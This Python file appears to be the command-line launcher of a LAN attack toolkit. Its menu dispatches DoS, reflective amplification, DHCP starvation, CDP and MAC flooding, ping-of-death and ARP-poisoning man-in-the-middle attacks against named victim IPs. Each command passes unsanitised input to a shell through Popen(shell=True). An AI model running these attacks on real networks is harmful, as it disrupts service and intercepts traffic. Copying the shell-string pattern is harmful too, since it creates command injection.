#!/usr/bin/python3
import sys, os
import datetime
from os.path import isfile, join
from os import listdir
import colorama
from scapy.all import *
import signal
from time import sleep
import re
import string
import yaml
import random
from subprocess import Popen
from colorama import Fore, Back
sys.path.insert(0,'../')


global TOOLS_PATH, STRUCT_PATH
TOOLS_PATH = os.getcwd() + "/tools/"
STRUCT_PATH = os.getcwd() + "/packet_struct/"

global GREEN, RED, YELLOW, MAGENTA, RESET
GREEN = Fore. GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
MAGENTA = Fore.MAGENTA
RESET = Fore.RESET

# auto-completion
cmdList = [
            'mac_flood_switch ',
            'ntp_reflective ',
            'dos_blacknurse ',
            'dhcp_starvation ',
            'ping_of_death ',
            'cdp_flood ',
            'ssdp_reflective ',
            'dns_reflective ',
            'arp_cache_poisoning ',
            'test(',
            'start ',
            'stop ',
            'dos ',
            'flood ',
	    'exit',
	    'help',
            'info ',
	    'quit']


############################################################
############################################################
############################################################

def completer(text, state):
    """
	auto-completion
    """
    options = [x for x in cmdList if x.startswith(text)]
    try:
        return options[state]
    except IndexError:
        return None



############################################################
############################################################
############################################################

def help_menu():
    print(RESET + "="*60)
    print(" ** LAN vulner **")
    print("="*23+"GENERAL"+"="*30)
    print(GREEN + " ?/help\t\t\t"+MAGENTA+ "display this help"+RESET)
    print(GREEN + " info <cmd>\t\t"+MAGENTA+ "display some info for a specific command"+RESET)
    print(GREEN + " quit/exit\t\t"+MAGENTA +"quit the program"+RESET)
    print("="*23+"ACTIONS"+"="*30)
    print(GREEN + " mac_flood_switch "+YELLOW+"<test(2)/flood> <interface>\t\t\t\t"+MAGENTA + "ARP Flooding the switch's MAC Table with ARP requests"+RESET)
    print(GREEN + " ntp_reflective "+YELLOW+"<test(2)/flood> <ntp_srv_ip> <victim_ip> <interface>\t"+MAGENTA+ "NTP Reflective Attack (send MON_GETLIST)" + RESET)
    print(GREEN + " dos_blacknurse "+YELLOW+"<test(2)/dos> <attacker_ip> <victim_ip> <interface>\t"+MAGENTA + "Blacknurse (ICMP code 3, type 3)" + RESET)
    print(GREEN + " dhcp_starvation "+YELLOW+"<test(2)/dos> <interface>\t\t\t\t"+MAGENTA + "DHCP starvation (message-type: discover)" + RESET)
    print(GREEN + " ping_of_death "+YELLOW+"<test(2)/dos> <victim_ip> <interface>\t\t\t"+MAGENTA + "old Ping Of Death" + RESET)
    print(GREEN + " cdp_flood "+YELLOW+"<test(2)/dos> <interface>\t\t\t\t\t"+MAGENTA + "CDP flooding the switch with CDP packets" + RESET)
    print(GREEN + " ssdp_reflective "+YELLOW+"<test(2)/flood> <ssdp_srv_ip> <victim_ip> <interface>\t"+MAGENTA+ "SSDP Reflective Attack (ssdp: rootdevice)" + RESET)
    print(GREEN + " dns_reflective "+YELLOW+"<test(2)/flood> <dns_srv_ip> <victim_ip> <website.com> <interface>\t"+MAGENTA+ "DNS Reflective Attack" + RESET)
    print(GREEN + " arp_cache_poisoning "+YELLOW+"<start/stop> <victim_ip> <gateway_ip> <interface>\t"+MAGENTA+ "MITM via ARP cache poisoning" + RESET)
    print("="*60)
    print(RED + " Don't be an asshole and only use the test(2) parameter." + RESET)
    print(RED + " Of course, don't forget that wireshark is your friend !" + RESET)
    print("="*60)

def parsing_attack(arg_attack):
    attack = re.match(r'^(.*)\(.*\)$', arg_attack)
    attack = attack.group(1)
    
    if attack == "test":
        num_req = re.match(r'test\((.*)\)', arg_attack)
        num_req = num_req.group(1)
    else:
        num_req = ""

    return (attack, num_req)



def execute(cmd_tokens):
    """
    	execute the command+args
    	command: cmd_tokens[0]
    	args: cmd_tokens[i]
    """
    if len(cmd_tokens)==0:
        return False

    ############## INFO
    # display info about command
    if cmd_tokens[0] == 'info':
        if len(cmd_tokens) <= 2:
            with open(TOOLS_PATH + "infos.yaml", mode='r') as fp:
                info = yaml.load(fp)
            
            try:
                i = info[cmd_tokens[1]]
                print(i)
            except:
                print(RED + '[-] This command ('+ cmd_tokens[1] + ') may not exists' + RESET)
                print(RED + '[-] info <cmd>' + RESET)
            
        else:
            print(RED + "[-] info <cmd>" + RESET)

        return True


    ############## MAC FLOOD SWITCH
    # Flood the MAC Table of the switch
    if cmd_tokens[0] == 'mac_flood_switch':
        if len(cmd_tokens) <= 3:

            a, N = parsing_attack(cmd_tokens[1])

            if len(cmd_tokens)!=3:
                if cmd_tokens[3]:
                    interface = cmd_tokens[3]
                else:
                    interface = "eth0"
            else:
                interface= "eth0"

            cmd_line = TOOLS_PATH + "mac_flood_switch.py -t " + a + " -N " + N + " -I " + interface

            Popen(cmd_line, shell=True)
        else:
            print(RED + "[-] ntp_reflective <test/flood> <interface>" + RESET)

        return True
            

    ############## NTP REFLECTIVE ATTACK
    # 
    if cmd_tokens[0] == 'ntp_reflective':
        if len(cmd_tokens) <= 5:
        
            a, N = parsing_attack(cmd_tokens[1])

            if len(cmd_tokens)!=4:
                if cmd_tokens[4]:
                    interface = cmd_tokens[4]
                else:
                    interface = "eth0"
            else:
                interface= "eth0"

            cmd_line = TOOLS_PATH + "ntp_reflective.py -t " + a + " -n " + cmd_tokens[2] + " -v " + cmd_tokens[3] + " -N " + N + " -I " + interface

            Popen(cmd_line, shell=True)
        else:
            print(RED + "[-] ntp_reflective <test/flood> <victim_ip> <ntp_srv_ip> <interface>" + RESET)


        return True


    ############## DOS BLACKNURSE
    #
    if cmd_tokens[0] == 'dos_blacknurse':
        if len(cmd_tokens) <= 5:

            a, N = parsing_attack(cmd_tokens[1])

            if len(cmd_tokens)!=4:
                if cmd_tokens[4]:
                    interface = cmd_tokens[4]
                else:
                    interface = "eth0"
            else:
                interface= "eth0"

            cmd_line = TOOLS_PATH + "dos_blacknurse.py -t " + a + " -a " + cmd_tokens[2] + " -v " + cmd_tokens[3] + " -N " + N + " -I " + interface

            Popen(cmd_line, shell=True)

        else:
            print(RED + "[-] dos_blacknurse <test/dos> <attacker_ip> <victim_ip> <interface>"  + RESET)

        return True
            

    ############## DHCP STARVATION
    #
    if cmd_tokens[0] == 'dhcp_starvation':
        if len(cmd_tokens) <= 3:

            a, N = parsing_attack(cmd_tokens[1])

            if len(cmd_tokens)!=2:
                if cmd_tokens[2]:
                    interface = cmd_tokens[2]
                else:
                    interface = "eth0"
            else:
                interface= "eth0"

            cmd_line = TOOLS_PATH + "dhcp_starvation.py -t " + a + " -N " + N + " -I " + interface

            Popen(cmd_line, shell=True)

        else:
            print(RED + "[-] dhcp_starvation <test/dos> <interface>"  + RESET)

        return True


    ############## PING OF DEATH
    #
    if cmd_tokens[0] == 'ping_of_death':
        if len(cmd_tokens) <= 4:
            
            a, N = parsing_attack(cmd_tokens[1])

            if len(cmd_tokens)!=3:
                if cmd_tokens[3]:
                    interface = cmd_tokens[3]
                else:
                    interface = "eth0"
            else:
                interface= "eth0"

            cmd_line = TOOLS_PATH + "ping_of_death.py -t " + a + " -v " + cmd_tokens[2] + " -N " + N + " -I " + interface

            Popen(cmd_line, shell=True)


        else:
            print(RED + "[-] ping_of_death <test/dos> <victim_ip> <interface>"  + RESET)

        return True


    ############## CDP FLOODING
    #
    if cmd_tokens[0] == 'cdp_flood':
        if len(cmd_tokens) <= 3:

            a, N = parsing_attack(cmd_tokens[1])

            if len(cmd_tokens)!=2:
                if cmd_tokens[2]:
                    interface = cmd_tokens[2]
                else:
                    interface = "eth0"
            else:
                interface= "eth0"

            cmd_line = TOOLS_PATH + "cdp_flood.py -t " + a + " -N " + N + " -s " + STRUCT_PATH + "cdp.yaml" + " -I " + interface

            Popen(cmd_line, shell=True)

        else:
            print(RED + "[-] cdp_flood <test/flood> <interface>"  + RESET)

        return True


    ############## SSDP REFLECTIVE ATTACK
    # 
    if cmd_tokens[0] == 'ssdp_reflective':
        if len(cmd_tokens) <= 5:
        
            a, N = parsing_attack(cmd_tokens[1])
            
            if len(cmd_tokens)!=4:
                if cmd_tokens[4]:
                    interface = cmd_tokens[4]
                else:
                    interface = "eth0"
            else:
                interface= "eth0"

            cmd_line = TOOLS_PATH + "ssdp_reflective.py -t " + a + " -s " + cmd_tokens[2] + " -v " + cmd_tokens[3] + " -N " + N + " -I " + interface

            Popen(cmd_line, shell=True)
        else:
            print(RED + "[-] ntp_reflective <test/flood> <ssdp_srv_ip> <victim_ip> <interface>" + RESET)


        return True


    ############## DNS REFLECTIVE ATTACK
    # 
    if cmd_tokens[0] == 'dns_reflective':
        if len(cmd_tokens) <= 6:
        
            a, N = parsing_attack(cmd_tokens[1])
            
            if len(cmd_tokens)!=5:
                if cmd_tokens[5]:
                    interface = cmd_tokens[5]
                else:
                    interface = "eth0"
            else:
                interface= "eth0"

            cmd_line = TOOLS_PATH + "dns_reflective.py -t " + a + " -d " + cmd_tokens[2] + " -v " + cmd_tokens[3] + " -w " + cmd_tokens[4] + " -N " + N + " -I " + interface

            Popen(cmd_line, shell=True)
        else:
            print(RED + "[-] ntp_reflective <test/flood> <ssdp_srv_ip> <victim_ip> <interface>" + RESET)


        return True


    ############## ARP CACHE POISONING: MITM
    # 
    if cmd_tokens[0] == 'arp_cache_poisoning':
        if len(cmd_tokens) <= 5:
        
            
            if len(cmd_tokens)!=4:
                if cmd_tokens[4]:
                    interface = cmd_tokens[4]
                else:
                    interface = "eth0"
            else:
                interface= "eth0"

            cmd_line = TOOLS_PATH + "arp_cache_poisoning.py -s " + cmd_tokens[1] + " -v " + cmd_tokens[2] + " -r " + cmd_tokens[3] + " -I " + interface

            Popen(cmd_line, shell=True)
        else:
            print(RED + "[-] arp_cache_poisoning <start/stop> <victim_ip> <gateway_ip> <interface>" + RESET)


        return True

    ############## HELP
    if (cmd_tokens[0] == '?' or cmd_tokens[0]=='help'):
        help_menu()
        return True

    ############## QUIT
    if (cmd_tokens[0]=="quit" or cmd_tokens[0]=="exit"):
        sys.exit(1)

    ############## IF COMMAND DOES NOT EXIST
    print(" [*] that command does not exist")
    return False
